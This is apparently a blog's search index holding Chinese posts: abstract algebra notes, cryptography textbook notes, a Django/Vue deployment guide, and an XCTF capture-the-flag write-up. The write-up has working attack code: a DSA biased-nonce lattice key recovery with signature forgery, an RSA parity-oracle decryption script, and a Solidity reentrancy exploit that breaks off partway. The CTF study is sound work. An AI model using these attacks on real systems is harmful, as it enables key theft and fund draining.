<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[抽象代数笔记]]></title>
    <url>%2F2020%2F05%2F14%2F%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[简介密码学必修课抽象代数的笔记，看心情学习2333。内容来自南开大学邓少强老师的公开课。 抽象代数历史抽象代数来自于代数方程的解，比如： 一次代数方程：$ax+b=0$ 二次代数方程：$ax^2+bx+c=0$，古巴比伦时期便可解，有解且为根式解 三次四次代数方程：$ax^3+bx^2+cx+d=0$ 或 $ax^4+bx^3++cx^2+dx+e=0$，十七世纪才发现存在根式解 五次及以上代数方程，是否存在根式解？这个问题被许多数学家研究过，比如： L. Euler 1707-1783 J. L. Lagrange 1736-1813，他是第一个假设根为集合，观察集合的变化来做的 C. F. Gauss 1777-1855 以上三人认为五次及以上的代数方程不存在根式解 之后的数学家N. H. Abel (1802-1829)，不仅仅证明了某些代数方程不存在根式解，而且找出了一类特殊的方程可以用根式解 最后，数学家E. Galois (1811-1832)，他在19岁的时候解决了该问题，并创立了Galois理论，该理论给出了五次及以上的代数方程有根式解的充分必要条件。可惜的是，该理论1846年才被发表，之后Jordan把该理论介绍给了大家，该理论才得以发展。 第一章 群第一节 运算及其关系代数体系代数体系粗略地讲便是集合+运算（不考虑空集） 集合集合不给出具体的定义，如果给出定义则会出现悖论 嵌入映射（定义1.1.1）设$A_0$为$A$的子集，定义$A_0$到$A$的映射$$f: A_0 \rightarrow A, f(x) = x, x \in A_0$$则称$f$为$A_0$到$A$的嵌入映射 开拓和限制（定义1.1.2）设$A_0$为$A$的子集，$f$为$A$到$B$的映射，$g$为$A_0$到$B$的映射，如果$f(x)=g(x),\forall x \in A_0$，则称$f$为$g$的开拓，$g$为$f$（在$A_0$上）的限制，记为$g=f\mid_{A_0}$ 交换图$$f_1:A_1 \rightarrow A_2,f_2:A_2 \rightarrow A_3,f_3:A_3 \rightarrow C$$ $$f_1f_2f_3:A_1 \rightarrow C$$ 且$$g_1:A_1 \rightarrow B,g_2:B \rightarrow C$$ $$G_1G_2:A_1 \rightarrow C$$ 则$$f_1f_2f_3=g_1g_2$$有交换图 例子：将开拓和限制转化为交换图设$A_0,A,B$如定义1.1.1和1.1.2，$f$为$g$的开拓，则有交换图 直积（定义1.1.3）设$A_1,A_2$为两个集合，令$$A_1 \times A_2 = { (a,b)\mid a \in A_1, b \in B_2 }$$集合$A_1 \times A_2$ 称为$A_1$与$A_2$的直积 运算运算的本质：两个元素按照一定的运算法则（加减乘除）得到一个元素 代数运算（定义1.1.4）设$A,B,D$为三个非空集合，则映射$f:A \times B \rightarrow D$称为一个$A$与$B$到$D$的代数运算 例子设$V$为线性空间，数域为$P$，则 $V$的加法：$V \times V \rightarrow V$ $P$与$V$的数乘：$P \times V \rightarrow V$ 二元运算若定义1.1.4中的$A,B,D$都相同，则称$f$为$A$上的二元运算，其记号表示为$a \circ b$或$ab$ 交换律（定义1.1.5）设$A$上定义了二元运算，满足$$ab=ba,\forall a,b \in A$$则称（二元）运算满足交换律，并且交换律可以使得$a^n,a \in A,n \in \mathbb N$有意义 结合律（定义1.1.6）设$A$上定义了运算，满足$$a(bc)=(ab)c,\forall a,b,c \in A$$则称运算满足结合律，并且结合律可以使得$(ab)^n=a^nb^n,a,b \in A,n \in \mathbb N$有意义 分配律（定义1.1.7）设A上定义了两种运算$\circ,+$，满足$$a \circ (b+c) = a \circ b + a \circ c , \forall a,b,c \in A$$则称运算满足$\circ$对$+$的左分配律，反过来便是右分配律，统称分配律 运算表设$$f:A \times B \rightarrow D,|A|&lt;\infty,|B|&lt;\infty$$ $$A={a_1,a_2,…,a_n},B={b_1,b_2,…,b_n}$$ 且运算为$\circ $，则运算表为 如果$A=B$且结果关于对角线对称，则该运算满足交换律 构造新集合的方法——关系关系：非空集合$A$中一种对两个元素而言的一种性质，使$A$中任何两个元素，或有这种性质，或没有这种性质，二者必居其一。 $a$与$b$有关系$R$，将有关系的元素对构成$A \times A$的子集，则$R={(a,b) \mid aRb}$ 反之，$A \times A$中有一个子集$R$，则可以定义关系$R$使得$aRb \rightleftharpoons (a,b) \in R$ 关系（定义1.1.9）设$A$为非空集合，$A$中的一个关系为$A \times A$的一个子集$R$ 例子设$A=\mathbb R$，则关系$\leq$为 等价关系（定义1.1.10）设$A$为非空集合中定义了一个关系$R$，若$R$满足条件 反身性：$\forall a \in A,aRa$ 对称性：$aRa \Rightarrow bRa$ 传递性：$aRb,bRc \Rightarrow aRc$ 则称$R$为等价关系 例子“$&lt;$”不是$\mathbb R$中的等价关系 $\mathbb P^{n \times n}$中的“相似”为等价关系 划分（分类）（定义1.1.11）设$A$为非空集合，$A$ 的划分（分类）是指$A$中一些子集合的集合，满足$\forall a \in A$，$a$包含而且只包含在一个子集合中 定理1.1.1$A$的一个分类决定$A$中一个等价关系 证明设$A= \bigcup_{i \in I}A_i,A_i \neq \emptyset,A_i \bigcap A_j = \emptyset, i \neq j$定义关系$R$，则$aRb \rightleftharpoons \exists i$，使得$a,b \in A_i$（$a$与$b$在同一个类中，等价关系的三个条件： 反身性：一定成立 对称性：一定成立 传递性：$aRb,\exists i,a,b \in A_i$且$bRc,\exists j,b,c \in A_j$，则由于$A_i \bigcap A_j=\emptyset$，故$i=j$，即$aRc$，成立 证毕 等价类（定义1.1.12）设$A$为非空集合，$A$中有一个等价关系$R$，$a \in A$，定义$a$的等价类$\overline{a}={b \in A \mid aRb}$（或称为$a$所在的等价类） 商集合（定义1.1.13）设$A$为非空集合，$A$中定义了等价关系$R$，定义集合$A/R={\overline{a} \mid a \in A}$ （重复的只取一个），称为$A$对$R$的商集合 自然映射（定义1.1.14）映射$\pi : A \rightarrow A/R，\pi(a) = \overline{a}$称为$A$到$A/R$的自然映射 定理1.1.2$A$中一个等价关系决定$A$的一个分类 证明$A/R$就是$A$的一个分类 $\forall \overline{a} \in A/R,\overline{a} \subseteq A,\overline{a} \neq \emptyset,A = \bigcup_{a \in A}\overline{a}$（重复的只取一个），设$\overline{a} \neq \overline{b}$，若$\overline{a} \bigcap \overline{b} \neq \emptyset $，取$c \in \overline{a} \bigcap \overline{b}$，当$c \in \overline{a}$，可推出$aRc$；当$c \in \overline{b}$，可推出$bRc$，由对称性可将$aRc$划为$cRa$，再由传递性得$bRa$，故$ \overline{a} = \overline{b}$，矛盾；则当$ \overline{a} \neq \overline{b}$，$\overline{a} \bigcap \overline{b} = \emptyset$，故$A / R$为$A$的分类 证毕 等价关系和分类相同由定理1.1.1和定理1.1.2可知 同余关系（定义1.1.15）设$A$为非空集合，$A$中定义了一个二元运算$\circ$，又定义了等价关系$R$，如果$R$与$\circ$满足条件$$a_1Rb_1,a_2Rb_2 \Rightarrow (a_1 \circ a_2) \ R \ (b_1 \circ b_2)$$则称$R$为$\circ$的同余关系，新的二元运算为$\overline{\circ}$ 例子设$\mathbb Z$中取$m&gt;0$，定义关系$$aRb \rightleftharpoons m \mid b - a$$$\mathbb Z$中的关系$R$为等价关系，称为模$m$的同余关系，$aRb$记为$a \equiv b \ (mod \ n)$，$\mathbb Z$中有$+,\times$，$\mathbb R$为$+,\times$的同余关系 第二节 半群与群群粗略地说，群 = 非空集合 + 二元运算 + 性质 半群（定义1.2.1）设$G$为一个非空集合，$G$上有一个二元运算$\circ$，满足结合律，则称${ G ;\circ }$（或$G$）为一个半群 例子 $\mathbb N$为自然数集合（$0 \notin \mathbb N$），${ \mathbb N ; + }$为一个半群（无幺元），${ \mathbb N ; \times }$也为一个半群 设$A$为非空集合，$M(A)$为$A$中所有变换（$A \rightarrow A$的映射）的集合，${ M(A); \circ }$为一个半群 设$A$为非空集合，$P(A)$为$A$的幂集（即$A$的所有子集的集合，也包括空集），${ P(A); \bigcup}$为一个半群 幺元和幺半群（定义1.2.2）设${ G ; \circ}$为半群，若元素$e_1 \in G$，满足$\forall a \in G,e_1 \circ a = a$，称$e_1$为$G$的左幺元；若元素$e_2 \in G$，满足$\forall a \in G,a \circ e_2 = a$，称$e_2$为$G$的右幺元；若$e \in G$即是左幺元又是右幺元，则称$e$为$G$的幺元，也称单位元，有幺元的半群称为幺半群 命题1.2.1幺半群中的幺元唯一 证明设$e,e’$为半群$G$的幺元，则$e=ee’=e’$，即幺半群中的幺元唯一 证毕 逆元和可逆元（定义1.2.3）设${ G ; \circ}$为幺半群，$e$为幺元，$a \in G$，若元素$a’$满足$a’ \circ a = e$，则称$a’$为$a$的左逆元；若元素$a’’$满足$a \circ a’’ = e$，则称$a’’$为$a$的右逆元；若$b \in G$即是$a$的左逆元，又是$a$的右逆元，则称$b$为$a$的逆元，记为$b=a^{-1}$，称$a$为可逆元 命题1.2.2设$G$为群，则$G$中任一元的逆元唯一 证明设$a \in G$，$a_1,a_2$均为$a$的逆元，则$(a_1a)a_2=ea_2=a_2,a_1(aa_2)=a_1e=a1$，由因为半群满足结合律，故$a_1=a_2$，即任一元的逆元唯一 证毕 群和交换群（Abel群）（定义1.2.4）设${ G ; \circ}$为幺半群，如果每一个元都是可逆元，则称$G$为群；若运算$\circ$还满足交换律，则称$G$为交换群，或阿贝尔（Abel）群 从集合的观点定义群设$G \neq \emptyset$，定义了二元运算$\circ$，则 $G$对$\circ$封闭 $\forall a \in G,a \circ (b \circ c) = (a \circ b) \circ c$（满足结合律） $G$存在幺元$e$，$\forall a \in G,e \circ a = a \circ e = a$ $\forall a \in G$，$a$存在逆元，即$\exists b, a \circ b = b \circ a = e$ 存在左幺元$e$，$\forall a \in G,e \circ a = a$ 存在右幺元$e$，$\forall a \in G,a \circ e = a$ $\forall a \in G$，$a$存在左逆元，即$\exists b, b \circ a = e$ $\forall a \in G$，$a$存在右逆元，即$\exists b, a \circ b = e$ 第一种定义方式：满足1234 第二种定义方式：满足1257 第三种定义方式：满足1268 例子 任何一个数域$\mathbb P$对数的加法为群（Abel群） 任何一个数域$\mathbb P$对数的乘法为幺半群，不为群（因为有0） ${ 1,-1}$对数的乘法构成群（Abel群） 设$A \neq \emptyset $，$S(A)$为$M(A)$中所有可逆变换，对$\circ$成一个群，称为$A$的全变换群 命题1.2.3群满足左右消去律 证明设$a,b,c, \in G,ab=ac$，用$a^{-1}$左乘得$a^{-1}(ab)=a^{-1}(ac)$，即$b=c$，故$G$满足左消去律，右消去律类似可证 证毕 命题1.2.4设$G$为群，则对任何$a,b \in G$，方程$ax=b,xa=b$都存在唯一解 证明对$ax=b$，用$a^{-1}b$代替$x$，等式左右相等，解存在。若$c_1,c_2$均为$ax=b$的解，则$ac_1=ac_2=b$，由消去律得$c_1=c_2$，故解唯一 对$xa=b$，与前一个方程相同 证毕 命题1.2.5设$G$为半群，若$\forall a,b \in G$，方程$ax=b,xa=b$都有解，则$G$为群 证明用群的定义方式1257证明，$G$为半群，则12成立。 $ \forall a \in G$，方程$xa=a$存在解$e_a$，$\forall c \in G$，方程$ax=c$有解$d$，则$c=ad$，$e_ac=e_a(ad)=ad=c$，即$e_a$为左幺元，5成立。 $\forall b \in G$，方程$xb=e_a$有解，解为$b$的左逆元，7成立 1257成立，则$G$为群 证毕 命题1.2.6有限半群$G$若满足左右消去律，则$G$为群 证明$|G|$为$G$中元素的个数，$|G|&lt; \infty$，设$G={a_1,a_2,…,a_n}$，考虑方程$a_ix=a_j$，元素$a_ia_1,a_ia_2,…,a_ia_n$都不重复（可用左消去律证明），必有一个为$a_j$，则$a_ix=a_j$有解；类似可证方程$xa_i=a_j$有解，则有命题1.2.5可得$G$为群 备注若$G$是无限半群，则有反例：$\mathbb N$对乘法，不是群 加法群和乘法群中的一些运算加法群$a \in G,n \in \mathbb N,na = \overbrace{a+ … + a}^{n}$，$a$的逆为$-a$，$0a=0$（等式左边的为数字0，右边的为$G$的幺元，记为零元） 乘法群$a \in G,n \in \mathbb N,a^n = \overbrace{a…a}^{n}$，$a$的逆为$a^{-1}$，$a^{-n} = \overbrace{a^{-1}…a^{-1}}^{n}$，$a^ma^n=a^{m+n}$ 群与对称欧几里得空间：刚体运动成群；保持平面图形整体不变的刚体运动成群 阶、有限群和无限群（定义1.2.5）设$G$为群，$G$的阶指$G$中元素的个数，记号为$|G|$，若$|G|$有限，则称$G$为有限群；若$G$无限，则称$G$为无限群 阶的定义（定义1.2.6）设$G$为群，$a \in G$，若对任何$n \in \mathbb N$，$a^n \neq e$，则称$a$的阶为无穷；若至少存在一个$m \in \mathbb N$，$a^m=e$，则定义a的阶为$min{k \in \mathbb N,a^k=e}$ 特殊元素的阶$|e|=1$ $|a|=|a^{-1}|$ 命题1.2.7设$G$为群，$a \in G$，则$a$的阶为无穷的充分必要条件为下列序列不出现重复$$…,a^{-n},…,a^{-1},e,a,a^2,…,a^n,…$$即$a^m \neq a^n,\forall m,n \in \mathbb Z,m \neq n$ 证明若$a$的阶无穷，反设$\exists m \neq n$，使$a^m=a^n$，设$m&gt;n$，则$a^{m-n}=e$，矛盾，故$a^m \neq a^n,\forall m,n \in \mathbb Z,m \neq n$ 反之，若$a^m \neq a^n,\forall m,n \in \mathbb Z,m \neq n$，则设$n=0,\forall m \in \mathbb N,a^m \neq a^0 = e$，故$a$的阶为无穷 命题1.2.8设$G$为群，$a \in G$，$a$的阶为$d$，则 $a^k=e \rightleftharpoons d \mid k$ $a^k=a^h \rightleftharpoons a^{k-h}=e \rightleftharpoons d \mid h-k$ 证明只证明1，2可以由1直接推出 设$k = dm$，则$a^k=a^{dm}=(a^d)^m=e^m=e$ 另一方面，设$a^k=e$，$k=dq+r$，$q,r \in \mathbb Z$，$0 \leq r &lt;d$，若$r \neq 0$，则$a^r=a^{k-dq}=a^k(a^d)^{-q}=e$与$a$的阶为$d$矛盾，故$r=0$，$d \mid k$ 命题1.2.9设$G$为群，$a \in G$，$a$的阶为$d$，则 $a^k$的阶为$d/gcd(d,k)$（$k&gt;0$） $a^k$的阶为$d \rightleftharpoons$ $gcd(d,k)=1$ 证明只证明1，2可以由1直接推出 设$a^k$的阶为$q$，设$d = d_1* gcd(d,k)$，$k = k_1 * gcd(d,k)$，则$(a^k)^q=e=a^{qk}$，故$d \mid qk$，即$d_1 \mid k_1q$，因$gcd(d_1,k_1)=1$，故$d/gcd(d,k) \mid q$ 反之，$(a^k)^{d_1}=a^{kd_1}=a^{k1gcd(d,k)d_1}=a^{k_1d}=(a^d)^{k_1}=e$，因$a^k$的阶为$q$，故$q \mid d_1$，即$q \mid d/gcd(d,k)$ ，则$q=d/gcd(d,k)$ 综上所述，$ q=d/gcd(d,k) $ 证毕 命题1.2.10设$G$为群，$a,b \in G$，$a$的阶为$m$，$b$的阶为$n$，且$ab=ba$，$gcd(m,n)=1$，则$ab$的阶为$mn$ 证明设$ab$的阶为$q$，则由$ab=ba$可以得到$(ab)^{mn}=a^{mn}b^{mn}=e$，故$q \mid mn$ 另一方面，$b^{qm}=a^{qm}b^{qm}=(ab)^{qm}=((ab)^q)^m=e^m=e$，因为$b$的阶为$n$，所以$n \mid qm$，又因为$gcd(m,n)=1$，所以$n \mid q$；同理可得$m \mid q$，又因为$gcd(m,n)=1$，则$mn \mid q$ 综上所述，$q=mn$ 证毕]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[An Introduction to Mathematical Cryptography 笔记]]></title>
    <url>%2F2020%2F05%2F12%2FAn-Introduction-to-Mathematical-Cryptography-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[简介“An Introduction to Mathematical Cryptography” 这本书的一点笔记，主要是方便我日后查看，所以可能只有我觉得比较重要的截图。本书来自于Soreat_u师傅推荐。 Chapter 1: An Introduction to CryptographyCryptanalysis of Simple Substitution CiphersFrequency Of Letters In English Text Divisibility and Greatest Common DivisorsThe Euclidean Algorithm Extended Euclidean Algorithm Modular ArithmeticZ/MZ units Euler’s Phi Function Modular Arithmetic and Shift CiphersThe Fast Powering Algorithm A Low-storage Variant Of The Square-and-multiply Algorithm Prime Numbers, Unique Factorization, and Finite FieldsField and Finite Field Powers and Primitive Roots in Finite FieldsFermat’s Little Theorem Primitive Root Theorem Chapter 2: Discrete Logarithms and Diffie-HellmanThe Discrete Logarithm ProblemDiscrete Logarithm Problem Diﬃe–Hellman Key ExchangeDiffie-Hellman Key Exchange Diffie-Hellman Problem The Elgamal Public Key CryptosystemElgamal Public Key Cryptosystem An Overview of the Theory of GroupsCommutative Group Group order Lagrange’s Theorem How Hard Is the Discrete Logarithm Problem?Order Notation A Collision Algorithm for the DLPTrivial Bound for DLP Shanks’s Babystep–Giantstep Algorithm The Chinese Remainder TheoremChinese Remainder Theorem Solving Congruences with Composite Moduli The Pohlig–Hellman AlgorithmPohlig–Hellman Algorithm Example Rings, Quotient Rings, Polynomial Rings, and Finite FieldsAn Overview of the Theory of Rings Divisibility and Quotient RingsUnit Congruent modulo Quotient Ring Polynomial Rings and the Euclidean AlgorithmMonic polynomial Euclidean algorithm Common divisor Extended Euclidean algorithm Quotients of Polynomial Rings and Finite Fields of Prime Power Order Chapter 3: Integer Factorization and RSAEuler’s Formula and Roots Modulo pqEuler’s Formula for pq The RSA Public Key CryptosystemRSA Public Key Cryptosystem Encryption and Decryption Exponent Implementation and Security IssuesMan-in-the-Middle Attack Common Module Attack Primality TestingFermat’s Little Theorem, Version 2 Witness Carmichael numbers Miller–Rabin test Miller–Rabin witness The Distribution of the Set of PrimesThe Prime Number Theorem Primality Proofs Versus Probabilistic TestsAKS Primality Test Pollard’s p−1 Factorization AlgorithmPollard’s p−1 factorization algorithm Factorization via Diﬀerence of SquaresExample Tips A three step factorization procedureGeneral More Smooth Numbers, Sieves, and Building Relations for FactorizationB-smooth Canﬁeld, Erdos, Pomerance Order Notation Grow exponentially and grow polynomially The growth of L(x) Running time of three step factorization procedure The Quadratic Sieve The Number Field Sieve The Index Calculus Method for Computing Discrete Logarithms in FpIndex Calculus Example Quadratic Residues and Quadratic ReciprocityQuadratic residue modulo and Quadratic nonresidue modulo Legendre symbol Quadratic Reciprocity Jacobi symbol Quadratic Reciprocity: Version II An application of quadratic reciprocity to the discrete logarithm problem Quadratic Reciprocity: Final Probabilistic Encryption and the Goldwasser–Micali CryptosystemGoldwasser–Micali probabilistic public key cryptosystem Chapter 4: Digital SignaturesWhat Is a Digital Signature?The two components of a digital signature scheme RSA Digital SignaturesRSA digital signatures Remark Elgamal Digital Signatures and DSAThe Elgamal digital signature algorithm The problem Eve should work on The digital signature algorithm (DSA） Some tips]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue+Django-rest-framework的项目搭建]]></title>
    <url>%2F2020%2F03%2F29%2FVue-Django-rest-framework%E7%9A%84%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[简介毕设做的是安卓+Vue+Django的项目，在这里先记录一下服务器端的搭建问题。 内容Centos添加新用户 12useradd usernamepasswd username Python3.6-dev1yum install -y python3-devel.x86_64 Nginx使用Yum安装 1yum -y install nginx 操作命令 123service nginx start #启动service nginx stop #停止systemctl restart nginx 设置/etc/nginx/nginx.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960user nginx;worker_processes 1;error_log /var/log/nginx/error.log warn;pid /var/run/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include /etc/nginx/mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; #新加入的部分 upstream django &#123; server 127.0.0.1:8080; #端口8001必须和uwsgi配置文件中的socket端口一样 &#125; server &#123; listen 80 default_server;# listen [::]:80 default_server; server_name www.your_domain.com your_domain.com your_ip_addr; root /root/Learning-Python3/cmdb; #项目路径 # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / &#123; include uwsgi_params; uwsgi_pass django; &#125; &#125; #一直到这里&#125; uWSGI使用pip3安装 1pip3 install uwsgi uwsgi.ini配置文件 1234567891011121314[uwsgi]socket = 127.0.0.1:8080stats = 127.0.0.1:9090workers = 4# 项目根目录chdir = DJANGO_DIRtouch-reload = DJANGO_DIRpy-auto-reload = 1# 在项目跟目录和项目同名的文件夹里面的一个文件module= DJANGO_NAME.wsgipidfile = /var/run/inner_manager.piddaemonize = /data/uwsgi9090.log# If you plan to receive big requests with lots of headers you can increase this value up to 64k (65535).buffer-size=65535 其中一些配置的含义 chdir—-应用加载前chdir到指定目录，一般设置为django的工程根目录 touch-reload—-如果修改/碰了指定的文件，那么重载uWSGI module—-加载一个WSGI模块的路径，如果django的话就指向对应的wsgi文件模块 buffer-size—-设置请求的最大大小 (排除request-body)，这一般映射到请求头的大小。默认情况下，它是4k。如果你接收到了一个更大的请求 (例如，带有大cookies或者查询字符串)，那么你也许需要增加它。它也是一个安全度量，所以调整为你的应用需要，而不是最大输出。该值如果太小会报错 常用命令 123uwsgi --ini uwsgi.ini # 启动uwsgi --reload uwsgi.ini # 重启uwsgi --stop uwsgi.ini # 关闭 Mysql123456789101112wget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpmrpm -ivh mysql-community-release-el6-5.noarch.rpmyum repolist all | grep mysqlyum install mysql-community-server -y#设置开机启动chkconfig --list | grep mysqldchkconfig mysqld on#启动并设置基础信息service mysqld startmysql_secure_installation 修改/etc/my.cnf 123456789sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION[mysql]default-character-set = utf8[mysql.server]default-character-set = utf8[mysqld_safe]default-character-set = utf8[client]default-character-set = utf8 重启mysql 1service mysqld restart Django安装Django rest framework 123pip3 install djangopip3 install djangorestframeworkpip3 install django-cors-headers 安装mysqlcilent 1234wget http://repo.mysql.com/mysql57-community-release-el7-8.noarch.rpmyum install gcc mariadb-develyum install mysql-develpip3 install mysqlclient 安装jwt 1pip3 install djangorestframework-jwt 运行 1python3 manage.py runserver 0.0.0.0:8000 Vue.js安装npm和nodejs 1yum install -y nodejs nodejs-npm 将config中的index.js改写 1assetsPublicPath: './' 修改prod.env.js 12345'use strict'module.exports = &#123; NODE_ENV: '"production"', API_HOST: '"http://localhost:8080"'&#125; 修改utils.js 12345678910if (options.extract) &#123; return ExtractTextPlugin.extract(&#123; use: loaders, fallback: 'vue-style-loader', publicPath:'../../' &#125;) &#125; else &#123; return ['vue-style-loader'].concat(loaders) &#125; &#125; 打包 1npm rum build]]></content>
  </entry>
  <entry>
    <title><![CDATA[2020-XCTF-公益赛]]></title>
    <url>%2F2020%2F03%2F09%2F2020-XCTF-%E5%85%AC%E7%9B%8A%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[简介这次跟着De1ta打的，最终第二名，没啥密码学的题，基本摸鱼23333 Crypto-NHP类似TetCTF2020的yaecchttps://colab.research.google.com/github/nguyenduyhieukma/CTF-Writeups/blob/master/TetCTF/2020/tetctf.ipynbhttps://nbviewer.jupyter.org/github/QyNh/TetCTF-2020/blob/master/yaecc/yaecc.ipynb 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106from pwn import *from Crypto.Util import numberfrom hashlib import sha256#context.log_level = 'debug'def solve_PoW(suffix, h): print "solving PoW......" charset = [chr(x) for x in range(255)] for p1 in charset: for p2 in charset: for p3 in charset: plaintext = p1 + p2+ p3+ suffix m = hashlib.sha256() m.update(plaintext) if m.hexdigest() == h: print "PoW solution has been found!" return p1+p2+p3r = remote('121.37.174.33',10000)sl = lambda s : r.sendline(s)rl = lambda : r.recvline()sd = lambda s : r.send(s)rc = lambda n=4096 : r.recv(n)ru = lambda s : r.recvuntil(s)def pad(m): l = 40 - len(m) res = '0'*l + m return resdef getsign(name): ru('$') sl('1') ru('Please input your username: ') sl(name) ru('k.bit_length() == ') kbits = int(ru('\n')[:-1]) ru('Here is your signature in hex: ') sign = ru('\n')[:-1] return sign,kbitsdef sign(x,q,p,g): m = 'admin' Hm = int(sha256(m).hexdigest(),16) k = 2 k_inv = number.inverse(k, q) r = pow(g, k, p) % q s = (k_inv * (Hm + x * r)) % q res = 'admin'.encode('hex') + pad(hex(r)[2:]) + pad(hex(s)[2:]) ru('$') sl('2') ru('Please send me your signature: ') sl(res) print(res) ru('sha256(XXX + ')suffix = (ru(')')[:-1]).decode('hex')ru('== ')h = ru('\n')[:-1]p = solve_PoW(suffix, h)p = p.encode('hex')sl(p)ru('p = ')p = int(ru('\n')[:-1])ru('q = ')q = int(ru('\n')[:-1])ru('g = ')g = int(ru('\n')[:-1])ru('y = ')y = int(ru('\n')[:-1])print('p = ' + str(p))print('q = ' + str(q))print('g = ' + str(g))print('y = ' + str(y))qbits = q.bit_length()res = []count = 0for i in range(5000000): data,kbits = getsign('ver') if qbits-kbits&gt;=8: count += 1 success('[+]Round: '+ str(count)) m1 = int(data[:6],16) r1 = int(data[6:46],16) s1 = int(data[-40:],16) res.append((m1,(r1,s1))) if count&gt;=40: breakwith open("/home/anemone/SageMath/data.txt", "w") as f: f.write(str(res))arg_list = [str(x) for x in [p,q,g,y]]SAGE = process(["/home/anemone/SageMath/sage", "/home/anemone/SageMath/exp.sage"] + arg_list)x = int(SAGE.recvline().strip())SAGE.close()print xsign(x,q,p,g)r.interactive() exp.sage 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from hashlib import sha256from sys import argvwith open("/home/anemone/SageMath/data.txt", "r") as f: d = f.readline()d = d.split(',')data = []for i in range(0,len(d),3): m = int(d[i][2:]) r = int(d[i+1][2:-1]) s = int(d[i+2][1:-3].rstrip('L')) data.append((m,(r,s)))assert len(argv[1:]) == 4[p,q,g,y] = [Integer(x) for x in argv[1:]]n = qZn = Zmod(n)size = len(data)-1m = []Ai = [-1]Bi = [0]r0, s0 = map(Zn, data[0][1])z0 = Zn(ZZ(sha256(hex(data[0][0])[2:].decode('hex')).hexdigest(), 16))for i in range(size): message, sig = data[i+1] ri, si = map(Zn, sig) zi = z = Zn(ZZ(sha256(hex(message)[2:].decode('hex')).hexdigest(), 16)) A = - (s0 * ri) / (r0 * si) B = (z0 * ri) / (si * r0) - zi / si Ai.append(A) Bi.append(B)Ai.append(0)res = n//2^8Bi.append(res)m.append(Ai)for i in range(size): m.append([0]*(i+1) + [n] + [0]*(size-i))m.append(Bi)m = Matrix(ZZ, m)mLLL = m.LLL()#print mLLLfor irow, row in enumerate(mLLL): k0 = Zn(row[0]) x = (s0*k0-z0)/r0 x = x%q if pow(g, x, p) == y: print("&#123;:d&#125;".format(int(x))) k0 = Zn(-row[0]) x = (s0*k0-z0)/r0 x = x%q if pow(g, x, p) == y: print("&#123;:d&#125;".format(int(x))) Crypto-lancetRSA parity oracle 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *import base64from Crypto.Util.number import *import libnum, gmpy2, socket, time, decimal#context.log_level = 'debug'r = remote('121.37.174.33',9999)def oracle(m): m = long_to_bytes(m) m = base64.b64encode(m) length = len(m) r.recvuntil('you can choose what you want here\n') r.send('2') r.recvuntil('send how long you want to decrypt\n') r.send(str(length)) r.recvuntil('send the message in base64 encode\n') r.send(m) r.recvuntil('res:') choice = r.recvuntil('\n')[:-1] if '1' == choice: return 1 if '0' == choice: return 0 else: exit(0)def challenge(): r.recvuntil('n:') n = int(r.recvuntil('\n')[:-1]) r.recvuntil('e:') e = int(r.recvuntil('\n')[:-1]) #e = 65537 r.recvuntil('flag:') c = int(r.recvuntil('\n')[:-1]) c_of_2 = pow(2, e, n) m = partial((c * c_of_2) % n, n,e)def partial(c, n,e): c_of_2 = pow(2, e, n) k = n.bit_length() decimal.getcontext().prec = k # allows for 'precise enough' floats lower = decimal.Decimal(0) upper = decimal.Decimal(n) for i in range(k): possible_plaintext = (lower + upper) / 2 # lower==0 when i&lt;1809 c += n*10**2048 flag = oracle(c) if not flag: upper = possible_plaintext # plaintext is in the lower half else: lower = possible_plaintext # plaintext is in the upper half c = (c * c_of_2) % n # multiply y by the encryption of 2 again print i, flag, int(upper - lower) # time.sleep(0.2) # By now, our plaintext is revealed! print upper print long_to_bytes(upper) return int(upper)challenge()r.interactive() BlockChain-OwnerMoney先弄四个结尾为0xfff的合约，然后把balance集中到一个合约自毁给目标合约凑够400wei然后就直接重入攻击即可 exp.sol 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283pragma solidity ^0.4.21;contract bank&#123; function buy() public payable&#123;&#125; function change(address addr) public&#123;&#125; function sell(uint256 num) public&#123;&#125; function transfer(address,uint256) public&#123;&#125;&#125;contract Anemone&#123; bank public target = bank(0x40a590b70790930ceed4d148bf365eea9e8b35f4); address fuck = 0x40a590b70790930ceed4d148bf365eea9e8b35f4; uint public isOwner = 0; uint public flag = 0; uint public num = 200; function Anemone() payable&#123; uint256 addr = uint256(address(this)); if(addr&amp;0xfff!=0xfff)&#123; selfdestruct(msg.sender); &#125; &#125; function setnum(uint256 n) public &#123; num = n; &#125; function step1() public payable &#123; target.buy.value(1 wei)(); &#125; function step2() public payable&#123; target.sell(num); &#125; function step3() public payable&#123; target.change(target); &#125; function step4() public payable&#123; fuck.call(0x11f776bc); &#125; function transfer(address addr) public&#123; target.transfer(addr,100); &#125; function payflag(string email)&#123; 